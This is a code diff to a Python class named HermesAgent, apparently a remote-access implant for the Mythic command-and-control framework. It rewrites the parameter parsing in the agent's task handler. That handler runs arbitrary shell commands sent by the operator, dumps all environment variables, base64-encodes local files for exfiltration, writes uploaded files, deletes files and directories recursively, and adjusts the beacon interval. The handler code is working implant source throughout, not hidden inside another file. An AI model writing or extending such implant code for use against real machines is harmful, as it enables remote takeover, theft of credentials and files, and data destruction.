@@ -270,72 +270,203 @@ class HermesAgent:
         except Exception:
             return None
 
+    def _get_param(self, params, key, default=""):
+        """Helper pour extraire un paramètre, même s'il est dans un dict imbriqué"""
+        if not isinstance(params, dict):
+            return default
+        
+        value = params.get(key, default)
+        
+        # Si la valeur est un dict, essayer d'extraire la valeur réelle
+        if isinstance(value, dict):
+            # Si le dict contient la même clé, prendre cette valeur (récursif)
+            if key in value:
+                return self._get_param(value, key, default)
+            # Sinon, prendre la première valeur string du dict
+            for v in value.values():
+                if isinstance(v, str) and v:
+                    return v
+            # Si aucune string trouvée, essayer de convertir le dict en string (pour debug)
+            return default
+        
+        # Si c'est déjà une string, la retourner
+        if isinstance(value, str):
+            return value
+        
+        # Si c'est un autre type (int, bool, etc.), le convertir en string
+        if value:
+            return str(value)
+        
+        return default
+    
     def run_task(self, task):
         task_id = task.get("id", "")
         cmd = task.get("command", "")
         params_str = task.get("parameters", "{}")
+        
+        # Parsing amélioré des paramètres
+        params = {}
         try:
-            params = json.loads(params_str) if isinstance(params_str, str) else (params_str or {})
+            if isinstance(params_str, str):
+                # Si c'est une string, essayer de la parser en JSON
+                if params_str.strip():
+                    try:
+                        params = json.loads(params_str)
+                        # Si params contient des valeurs qui sont elles-mêmes des strings JSON, les parser aussi
+                        for k, v in params.items():
+                            if isinstance(v, str) and v.strip().startswith("{") and v.strip().endswith("}"):
+                                try:
+                                    params[k] = json.loads(v)
+                                except:
+                                    pass
+                    except json.JSONDecodeError:
+                        # Si ce n'est pas du JSON valide, peut-être que c'est une commande shell directe
+                        # On garde params vide et on utilisera params_str directement pour shell
+                        params = {}
+                else:
+                    params = {}
+            elif isinstance(params_str, dict):
+                # Si c'est déjà un dict, l'utiliser directement
+                params = params_str.copy()
+                # Parser récursivement les valeurs qui sont des strings JSON
+                for k, v in params.items():
+                    if isinstance(v, str) and v.strip().startswith("{") and v.strip().endswith("}"):
+                        try:
+                            params[k] = json.loads(v)
+                        except:
+                            pass
+            else:
+                params = {}
         except Exception:
             params = {}
+        
         out = {"task_id": task_id, "user_output": "", "completed": True, "status": "success"}
         try:
             if cmd == "shell":
-                c = params.get("command", "")
-                r = subprocess.run(["sh", "-c", c], capture_output=True, text=True, timeout=60, cwd=self._cwd or None)
-                out["user_output"] = (r.stdout or "") + (r.stderr and ("\n" + r.stderr) or "")
-                if r.returncode != 0:
+                # Essayer plusieurs façons de récupérer la commande
+                c = self._get_param(params, "command", "")
+                
+                # Si params est vide ou si command n'existe pas, essayer params_str directement
+                if not c:
+                    # Peut-être que la commande est dans params_str directement (pas de JSON)
+                    if isinstance(params_str, str) and params_str.strip():
+                        # Si params_str ne commence pas par {, c'est probablement la commande directe
+                        if not params_str.strip().startswith("{"):
+                            c = params_str.strip()
+                        else:
+                            # C'est du JSON mais le parsing a échoué, essayer quand même
+                            try:
+                                parsed = json.loads(params_str)
+                                c = self._get_param(parsed, "command", "")
+                            except:
+                                pass
+                
+                # Vérifier qu'on a une commande valide
+                if not c:
+                    out["user_output"] = f"Command parameter missing or invalid. Received params={params}, params_str={repr(params_str)}"
                     out["status"] = "error"
+                else:
+                    # Exécuter la commande
+                    r = subprocess.run(["sh", "-c", c], capture_output=True, text=True, timeout=60, cwd=self._cwd or None)
+                    out["user_output"] = (r.stdout or "") + (r.stderr and ("\n" + r.stderr) or "")
+                    if r.returncode != 0:
+                        out["status"] = "error"
             elif cmd == "pwd":
                 out["user_output"] = self._cwd or get_cwd()
             elif cmd == "ls":
-                path = params.get("path", ".") or "."
+                path = self._get_param(params, "path", ".")
+                if not path or path == "{}":
+                    path = "."
                 path = os.path.join(self._cwd, path) if not os.path.isabs(path) else path
-                entries = []
-                for e in os.listdir(path):
-                    full = os.path.join(path, e)
-                    entries.append({"name": e, "is_file": os.path.isfile(full), "size": os.path.getsize(full) if os.path.isfile(full) else 0})
-                out["user_output"] = json.dumps(entries, indent=2)
+                if os.path.isdir(path):
+                    # Format lisible comme ls -la
+                    try:
+                        r = subprocess.run(["ls", "-lah", path], capture_output=True, text=True, timeout=10)
+                        if r.returncode == 0:
+                            out["user_output"] = r.stdout
+                        else:
+                            # Fallback: format manuel si ls échoue
+                            entries = []
+                            for e in sorted(os.listdir(path)):
+                                full = os.path.join(path, e)
+                                stat = os.stat(full)
+                                size = stat.st_size
+                                mode = oct(stat.st_mode)[-3:]
+                                mtime = time.strftime("%b %d %H:%M", time.localtime(stat.st_mtime))
+                                is_file = os.path.isfile(full)
+                                entries.append(f"{mode} {size:>8} {mtime} {'d' if not is_file else '-'} {e}")
+                            out["user_output"] = "\n".join(entries)
+                    except Exception:
+                        # Fallback: format JSON si tout échoue
+                        entries = []
+                        for e in sorted(os.listdir(path)):
+                            full = os.path.join(path, e)
+                            entries.append({"name": e, "is_file": os.path.isfile(full), "size": os.path.getsize(full) if os.path.isfile(full) else 0})
+                        out["user_output"] = json.dumps(entries, indent=2)
+                else:
+                    out["user_output"] = f"No such directory: {path}"
+                    out["status"] = "error"
             elif cmd == "cat":
-                path = params.get("path", "")
-                path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
-                with open(path, "r", errors="replace") as f:
-                    out["user_output"] = f.read()
+                path = self._get_param(params, "path", "")
+                if not path:
+                    out["user_output"] = "Path parameter required"
+                    out["status"] = "error"
+                else:
+                    path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
+                    if os.path.isfile(path):
+                        with open(path, "r", errors="replace") as f:
+                            out["user_output"] = f.read()
+                    else:
+                        out["user_output"] = f"File not found: {path}"
+                        out["status"] = "error"
             elif cmd == "cd":
-                path = params.get("path", ".")
+                path = self._get_param(params, "path", ".")
+                if path == "{}":
+                    path = "."
                 path = os.path.join(self._cwd, path) if not os.path.isabs(path) else path
                 if os.path.isdir(path):
                     self._cwd = os.path.abspath(path)
                     out["user_output"] = self._cwd
                 else:
-                    out["user_output"] = "No such directory"
+                    out["user_output"] = f"No such directory: {path}"
                     out["status"] = "error"
             elif cmd == "whoami":
                 out["user_output"] = f"user: {get_user()}\nhost: {get_hostname()}"
             elif cmd == "sleep":
-                sec = params.get("seconds", self.interval)
+                sec_str = self._get_param(params, "seconds", "")
+                if sec_str:
+                    try:
+                        sec = int(sec_str)
+                    except ValueError:
+                        sec = self.interval
+                else:
+                    sec = self.interval
                 self.interval = int(sec)
                 out["user_output"] = f"Sleep interval set to {self.interval}s"
             elif cmd == "exit":
                 self._running = False
                 out["user_output"] = "Exiting."
             elif cmd == "download":
-                path = params.get("path", "")
-                path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
-                if os.path.isfile(path):
-                    with open(path, "rb") as f:
-                        data = f.read()
-                    out["user_output"] = base64.b64encode(data).decode("ascii")
-                    out["full_path"] = os.path.abspath(path)
-                    # Mythic sometimes expects a download block in the response
-                    out["download"] = {"full_path": os.path.abspath(path), "contents": base64.b64encode(data).decode("ascii")}
-                else:
-                    out["user_output"] = "File not found"
+                path = self._get_param(params, "path", "")
+                if not path:
+                    out["user_output"] = "Path parameter required"
                     out["status"] = "error"
+                else:
+                    path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
+                    if os.path.isfile(path):
+                        with open(path, "rb") as f:
+                            data = f.read()
+                        out["user_output"] = base64.b64encode(data).decode("ascii")
+                        out["full_path"] = os.path.abspath(path)
+                        # Mythic sometimes expects a download block in the response
+                        out["download"] = {"full_path": os.path.abspath(path), "contents": base64.b64encode(data).decode("ascii")}
+                    else:
+                        out["user_output"] = f"File not found: {path}"
+                        out["status"] = "error"
             elif cmd == "upload":
                 # upload: params have remote_path and file_id (mythic) — agent side often receives content as base64 or file_id
-                remote = params.get("path", "") or params.get("remote_path", "")
-                content_b64 = params.get("contents") or params.get("file")
+                remote = self._get_param(params, "path", "") or self._get_param(params, "remote_path", "")
+                content_b64 = self._get_param(params, "contents", "") or self._get_param(params, "file", "")
                 if content_b64 and remote:
                     remote = os.path.join(self._cwd, remote) if not os.path.isabs(remote) else remote
                     try:
@@ -368,37 +499,98 @@ class HermesAgent:
             elif cmd == "env":
                 out["user_output"] = "\n".join([f"{k}={v}" for k, v in os.environ.items()])
             elif cmd == "rm":
-                path = params.get("path", "")
-                recursive = params.get("recursive", False)
-                path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
-                if recursive:
-                    import shutil
-                    shutil.rmtree(path)
-                    out["user_output"] = f"Removed directory: {path}"
+                path = self._get_param(params, "path", "")
+                if not path:
+                    out["user_output"] = "Path parameter required"
+                    out["status"] = "error"
                 else:
-                    os.remove(path)
-                    out["user_output"] = f"Removed: {path}"
+                    recursive = params.get("recursive", False)
+                    if not isinstance(recursive, bool):
+                        recursive = False
+                    path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
+                    try:
+                        if recursive:
+                            import shutil
+                            shutil.rmtree(path)
+                            out["user_output"] = f"Removed directory: {path}"
+                        else:
+                            os.remove(path)
+                            out["user_output"] = f"Removed: {path}"
+                    except Exception as e:
+                        out["user_output"] = f"Error removing {path}: {e}"
+                        out["status"] = "error"
             elif cmd == "mkdir":
-                path = params.get("path", "")
-                path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
-                os.makedirs(path, exist_ok=True)
-                out["user_output"] = f"Created directory: {path}"
+                # Debug: voir ce qui arrive
+                path = self._get_param(params, "path", "")
+                # Si path est toujours vide ou contient des accolades, essayer de parser params_str directement
+                if not path or "{" in str(path):
+                    # Peut-être que params_str contient directement le JSON
+                    if isinstance(params_str, str) and params_str.strip().startswith("{"):
+                        try:
+                            parsed = json.loads(params_str)
+                            path = self._get_param(parsed, "path", "")
+                        except:
+                            pass
+                    # Si toujours rien, essayer de prendre params_str directement si ce n'est pas du JSON
+                    if not path or "{" in str(path):
+                        if isinstance(params_str, str) and not params_str.strip().startswith("{"):
+                            path = params_str.strip()
+                
+                # Nettoyer path: enlever les accolades et extraire la valeur si c'est du JSON mal parsé
+                if isinstance(path, str) and path.startswith("{") and path.endswith("}"):
+                    try:
+                        parsed = json.loads(path)
+                        path = self._get_param(parsed, "path", "")
+                    except:
+                        # Si le parsing échoue, essayer d'extraire manuellement
+                        import re
+                        match = re.search(r'"path"\s*:\s*"([^"]+)"', path)
+                        if match:
+                            path = match.group(1)
+                
+                if not path or "{" in str(path):
+                    out["user_output"] = f"Path parameter invalid. params={params}, params_str={repr(params_str)}, extracted_path={repr(path)}"
+                    out["status"] = "error"
+                else:
+                    path = os.path.join(self._cwd, path) if path and not os.path.isabs(path) else path
+                    try:
+                        os.makedirs(path, exist_ok=True)
+                        out["user_output"] = f"Created directory: {path}"
+                    except Exception as e:
+                        out["user_output"] = f"Error creating directory {path}: {e}"
+                        out["status"] = "error"
             elif cmd == "cp":
-                src = params.get("source", "")
-                dst = params.get("destination", "")
-                src = os.path.join(self._cwd, src) if src and not os.path.isabs(src) else src
-                dst = os.path.join(self._cwd, dst) if dst and not os.path.isabs(dst) else dst
-                import shutil
-                shutil.copy2(src, dst)
-                out["user_output"] = f"Copied {src} to {dst}"
+                src = self._get_param(params, "source", "")
+                dst = self._get_param(params, "destination", "")
+                if not src or not dst:
+                    out["user_output"] = "Source and destination parameters required"
+                    out["status"] = "error"
+                else:
+                    src = os.path.join(self._cwd, src) if src and not os.path.isabs(src) else src
+                    dst = os.path.join(self._cwd, dst) if dst and not os.path.isabs(dst) else dst
+                    try:
+                        import shutil
+                        shutil.copy2(src, dst)
+                        out["user_output"] = f"Copied {src} to {dst}"
+                    except Exception as e:
+                        out["user_output"] = f"Error copying {src} to {dst}: {e}"
+                        out["status"] = "error"
             elif cmd == "mv":
-                src = params.get("source", "")
-                dst = params.get("destination", "")
-                src = os.path.join(self._cwd, src) if src and not os.path.isabs(src) else src
-                dst = os.path.join(self._cwd, dst) if dst and not os.path.isabs(dst) else dst
-                import shutil
-                shutil.move(src, dst)
-                out["user_output"] = f"Moved {src} to {dst}"
+                src = self._get_param(params, "source", "")
+                dst = self._get_param(params, "destination", "")
+                if not src or not dst:
+                    out["user_output"] = "Source and destination parameters required"
+                    out["status"] = "error"
+                else:
+                    src = os.path.join(self._cwd, src) if src and not os.path.isabs(src) else src
+                    dst = os.path.join(self._cwd, dst) if dst and not os.path.isabs(dst) else dst
+                    try:
+                        import shutil
+                        shutil.move(src, dst)
+                        out["user_output"] = f"Moved {src} to {dst}"
+                    except Exception as e:
+                        out["user_output"] = f"Error moving {src} to {dst}: {e}"
+                        out["status"] = "error"
             else:
                 out["user_output"] = f"Unknown command: {cmd}"
                 out["status"] = "error"
